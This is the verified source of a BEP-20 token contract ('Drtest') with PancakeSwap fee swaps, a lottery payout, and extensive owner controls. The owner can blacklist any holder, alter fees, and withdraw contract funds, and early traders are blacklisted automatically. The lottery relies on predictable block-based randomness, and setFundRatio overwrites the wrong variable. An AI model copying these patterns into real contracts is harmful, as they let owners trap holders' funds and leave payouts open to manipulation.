/**
 *Submitted for verification at BscScan.com on 2022-09-15
*/

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
   
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IPancakePair{
    function token0() external view returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

interface IWinner{
    function withdraw(uint256 amount) external;

    function withdrawToken(IERC20 __token, uint256 amount) external;

    function transferOwnership(address newOwner) external;
}

contract DRtest is 
    IERC20
{
    address public __owner;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;
    address public pair;
    uint256 public numTokensSell;
    address public marketAddress = 0x30B92Aea8E9347565F22390E7AE6d462d1e4607a;
    address public PancakeFactoryAddress;
    IPancakeRouter02 internal uniswapV2Router;
    IERC20 private c_usdt;
    mapping (address => bool) public isBlacklist;
    mapping (address => bool) public isExcludedFromFees;
    uint256 public tradingEnabledTimestamp;
    uint256 public blockNumTime = uint256(6);
    uint256 public totalRatio = uint256(100000000);
    uint256 public fundRatio;
    uint256 public awardRatio;
    uint256 public winnerRatio;
    uint256 public winnerURatio;
    bool public openStatus = true;
    address private creator;
    string private tokenName;
    string private tokenSymbol;
    uint8 private tokenDecimal;
    IWinner public winnerContrace = IWinner(0x51Bc8dc13c55df3467EDEefc873bacBd0032Ca5e);
    
    constructor(
    )
        payable
    {
        __owner = msg.sender;
        tokenDecimal = 18;
        numTokensSell = 10 ** tokenDecimal;
        isExcludedFromFees[msg.sender] = true;
        isExcludedFromFees[address(winnerContrace)] = true;
        tradingEnabledTimestamp = block.timestamp;
        uniswapV2Router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        c_usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
        uint256 total = uint256(10000)*10**tokenDecimal;
        tokenName = "Drtest";
        tokenSymbol = "DMtest";
        _balances[msg.sender] = total ;
        _totalSupply = total;
        emit Transfer(address(0), msg.sender, total);
        PancakeFactoryAddress = uniswapV2Router.factory();
        address _pair = pairFor(PancakeFactoryAddress, address(this), address(c_usdt));
        pair = _pair;
        isExcludedFromFees[address(this)] = true;
        fundRatio = uint256(1000000);
        awardRatio = uint256(3000000);
        winnerRatio = uint256(3);
        winnerURatio = uint256(100000000);
        creator = msg.sender;
    }

    event isWinnerEvent(address _winner,uint256 _timestemp,uint256 _amount,uint256 _randomKey,uint256 _result,uint256 _maxNumber,uint256 _winnerAmount);

    modifier onlyOwner() {
        require(__owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    modifier onlyCreator(){
        require( creator == msg.sender, "Ownable: caller is not the creator");
        _;
    }

    modifier valOutLimitOne(uint256 _val){
        require( _val <= uint256(10**8), "Value out of limit");
        _;
    }

    modifier valOutLimitTwo( uint256 _val ){
        require( _val <= uint256(10**7), "Value out of limit");
        _;
    }

    function symbol() 
        external 
        view 
        returns (string memory)
    {
        return tokenSymbol;
    }

    function name() 
        external 
        view 
        returns (string memory)
    {
        return tokenName;
    }

    function decimals() 
        external 
        view 
        returns (uint8) 
    {
        return tokenDecimal;
    }

    function totalSupply() 
        public 
        view 
        override 
        returns (uint256) 
    {
        return _totalSupply;
    }

    function balanceOf(address account) 
        external 
        view 
        override 
        returns (uint256) 
    {
        return _balances[account];
    }

    function allowance(address owner, address spender) 
        external 
        view 
        override 
        returns (uint256) 
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) 
        external 
        override 
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) 
        internal 
    {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) 
        external 
        override 
        returns (bool) 
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) 
        external 
        override 
        returns (bool) 
    {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function _transferNormal(address sender, address recipient, uint256 amount) 
        private 
    {
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _transferNoswap() 
        private 
    {
        uint256 contractTokenBalance = _balances[address(this)];
        uint256 fundAmount = contractTokenBalance * fundRatio / (awardRatio + fundRatio);
        uint256 awardAmount = contractTokenBalance - fundAmount;
        if (contractTokenBalance >= numTokensSell) {
            swapTokensForUSDT(fundAmount);
            swapTokensForUSDTC(awardAmount);
        }
    }

    function swapTokensForUSDT(uint256 tokenAmount) 
        private 
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(c_usdt);
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            marketAddress,
            block.timestamp
        );
    }

    function swapTokensForUSDTC(uint256 tokenAmount) 
        private 
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(c_usdt);
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(winnerContrace),
            block.timestamp
        );
    }

    function isWinner(address sender, address recipient, uint256 amount)
        internal
    {
        if( amount < uint256(1) ){
            return ;
        }
        if( sender == address(0) || sender == pair ){
            return ;
        }
        if( recipient !=  marketAddress){
            return ;
        }
        bytes memory info = abi.encodePacked( block.difficulty, block.timestamp,amount );
        bytes32 hash = keccak256(info);
        uint256 randomVal = uint( hash ) % uint256( winnerRatio );
        if( randomVal == uint256(0) ){
            return ;
        }
        uint256 currentAmount = IERC20(c_usdt).balanceOf( address(winnerContrace) ) * winnerURatio * randomVal / (totalRatio * uint256(100) );
        winnerContrace.withdrawToken(c_usdt, currentAmount);
        IERC20(c_usdt).transfer(sender, currentAmount);
        emit isWinnerEvent(sender, block.timestamp, amount, block.difficulty, randomVal, winnerRatio - 1, currentAmount);
    }

    function _transfer(address sender, address recipient, uint256 amount) 
        internal 
    {
        address _pair = pair;
        require(block.timestamp >= tradingEnabledTimestamp, "trade not open");
        if(block.timestamp <= tradingEnabledTimestamp + blockNumTime) {
            if(sender != _pair && sender != address(uniswapV2Router)) {
                isBlacklist[sender] = true;
            }
            if(recipient != _pair && recipient != address(uniswapV2Router)) {
                isBlacklist[recipient] = true;
            }
        }
        require(!isBlacklist[sender] && !isBlacklist[recipient], "in blacklist");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        if(isExcludedFromFees[sender] || isExcludedFromFees[recipient]) {
            _transferNormal(sender, recipient, amount);
            return;
        }
        isWinner(sender, recipient, amount);
        uint256 fundAmount = amount*(awardRatio + fundRatio)/totalRatio;
        _balances[address(this)] += fundAmount;
        emit Transfer(sender, address(this), fundAmount);
        uint256 receiveAmount = amount - fundAmount;
        _balances[recipient] += receiveAmount;
        emit Transfer(sender, recipient, receiveAmount);
        _transferNoswap();
    }

    function pairFor(address factory, address tokenA, address tokenB) 
        internal 
        pure 
        returns (address pair_) 
    {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair_ = address(uint160(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5'
        )))));
    }

    function setN(uint256 n) 
        external 
        onlyOwner 
    {
        numTokensSell = n;
    }

    function setTrade(uint256 t) 
        external 
        onlyOwner 
    {
        tradingEnabledTimestamp = t;
    }

    function setBlockNumTime(uint256 b)
        external 
        onlyOwner 
    {
        blockNumTime = b;
    }

    function setExcludeFee(address a, bool b) 
        external 
        onlyOwner 
    {
        isExcludedFromFees[a] = b;
    }

    function setBlacklist(address a, bool b)
        external 
        onlyOwner 
    {
        isBlacklist[a] = b;
    }

    function setAwardRatio(uint256 _awardRatio)
        external
        onlyOwner
        valOutLimitTwo(_awardRatio)
    {
        awardRatio = _awardRatio;
    }

    function setFundRatio( uint256 _fundRatio )
        external
        onlyOwner
        valOutLimitTwo(_fundRatio)
    {
        awardRatio = _fundRatio;
    }

    function withdraw(uint256 amount) 
        external
        onlyOwner
        onlyCreator
    {
        winnerContrace.withdraw(amount);
        payable(msg.sender).transfer(amount);
    }

    function withdrawToken(IERC20 __token, uint256 amount) 
        external 
        onlyOwner
        onlyCreator
    {
        winnerContrace.withdrawToken(__token, amount);
        IERC20(__token).transfer(msg.sender, amount);
    }

    function withdrawCurrent(uint256 amount) 
        external
        onlyOwner
        onlyCreator
    {
        payable(msg.sender).transfer(amount);
    }

    function withdrawCurrentToken(IERC20 __token, uint256 amount) 
        external 
        onlyOwner
        onlyCreator
    {
        IERC20(__token).transfer(msg.sender, amount);
    }

    function getRatio()
        external
        view
        returns(uint256 _ratio )
    {
        _ratio = awardRatio + fundRatio;
    }

    function getWinnerNum()
        external
        view
        returns( uint256 _winnerNum )
    {
        _winnerNum = IERC20(c_usdt).balanceOf( address(winnerContrace) );
    }

    function setWinnerRatio( uint256  _winnerRatio)
        external
        onlyOwner
        valOutLimitTwo(_winnerRatio)
    {
        winnerRatio = _winnerRatio;
    }

    function setWinnerURatio( uint256  _winnerURatio )
        external
        onlyOwner
        valOutLimitOne(_winnerURatio)
    {
        winnerURatio = _winnerURatio;
    }

    function setNumTokensSell( uint256 _numTokensSell )
        external
        onlyOwner
    {
        numTokensSell = _numTokensSell * 10 ** tokenDecimal;
    }

    function transferOwnership(address newOwner) 
        external
        onlyOwner 
    {
        __owner = newOwner;
    }

    function transferOwnershipWinner( address newOwner )
        external
        onlyOwner
    {
        IWinner(winnerContrace).transferOwnership(newOwner);
    }

    function setMarketAddress(address _marketAddress)
        external
        onlyOwner
    {
        marketAddress = _marketAddress;
    }

}